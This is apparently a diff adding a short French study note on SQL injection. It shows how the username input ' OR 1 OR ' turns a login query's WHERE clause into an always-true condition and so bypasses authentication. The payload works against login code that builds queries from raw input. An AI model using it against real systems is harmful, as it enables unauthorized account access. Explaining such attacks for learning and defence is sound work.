@@ -1,0 +1,23 @@
+' OR 1 OR '
+Requête dans le back-end :
+
+    SELECT * FROM users WHERE username = '' AND password = '';
+
+En injectant ceci dans le nom d'utilisateur
+
+    ' OR 1 OR '
+
+On obtient :
+
+    SELECT * FROM users WHERE username = '' OR 1 OR '' AND password = '';
+
+Avec :
+
+    username = '' OR 1 --> true
+    '' AND password = '' --> false
+
+On a :
+
+    WHERE true OR false --> true
+
+
